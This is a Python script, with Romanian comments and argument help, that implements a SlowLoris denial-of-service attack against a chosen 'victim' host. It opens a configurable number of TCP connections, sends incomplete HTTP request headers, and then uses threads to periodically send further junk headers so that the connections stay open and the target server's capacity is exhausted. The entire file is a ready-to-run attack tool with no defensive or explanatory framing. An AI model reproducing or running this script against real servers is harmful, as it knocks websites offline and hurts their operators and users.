import socket
import time
import random
import argparse
from threading import Thread


# command line input

cm = argparse.ArgumentParser( description=  "SlowLoris DoS attack")

cm.add_argument("-v", "--victima", type = str, help = "Hostname/Adresa IP a victimei", required = True)
cm.add_argument("-p", "--port", type = int, default = 80, help = "Portul la care are loc atacul, default port pentru http este 80")
cm.add_argument("-s", "--socket", type = int, default = 100, help = "Numarul de conexiuni care se vor deschide")
cm.add_argument("-i", "--interval", type = int, default = 10, help = "Intervalul de pauza intre momentele in care se trimit date, pentru a mentine conexiunea ")

args=cm.parse_args()

# input

victima_host = args.victima
victima_port = args.port
socketsNumber = args.socket
interval = args.interval

conexiuni = list ()

# initierea unei conexiuni tcp, cu datele primite la intrare, functia returneaza socket-ul creat


def creare_socket(host,port):

    sock = None

    for res in socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM):

        af,socktype,proto,canonname,sa =res

        try:

            sock= socket.socket(af, socktype,proto)

        except socket.error as error:

            print(error)
            sock = None
            continue

        try:

            sock.settimeout(3)
            sock.connect(sa)
            sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1993)).encode("utf-8"))
            sock.send("User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n".encode("utf-8"))
            sock.send("Accept-language: en-US,en\r\n".encode("utf-8"))

        except socket.error as error:

            print(error)
            sock.close()
            sock = None
        continue

    if sock is None:
        
        print (" Conexiunea cu serverul nu a putut fi stabilita ")

    return sock

# mentinerea conexiunii 

def keep_alive(socket):

    ok = False


    try:

         socket.send("X-a: loris{}\r\n".format(random.randint(1, 1000)).encode("utf-8"))
         ok = True

    except socket.error as error:
        print(error)

    
    if ok == False:
        print("Restabilirea conexiunii " + str(conexiuni.index(socket)))
        socket = creare_socket(victima_host, victima_port)


def atac():

    alive = True

    for i in range (socketsNumber):

        socket = creare_socket(victima_host,victima_port)
        conexiuni.append(socket)
        print(" A fost stabilita cu succes conexiunea # " + str(i))

    print("\n S-au stabilit : " + str(len(conexiuni)) + " conexiuni " )


    while alive :

        for socket in conexiuni:

            t = Thread(target = keep_alive, args = (socket,))
            t.daemon = True
            t.start()
        
        print (str(len(conexiuni)) + " conexiuni active ")

        time.sleep(interval)
	


if __name__ == "__main__":
    atac()

    
    



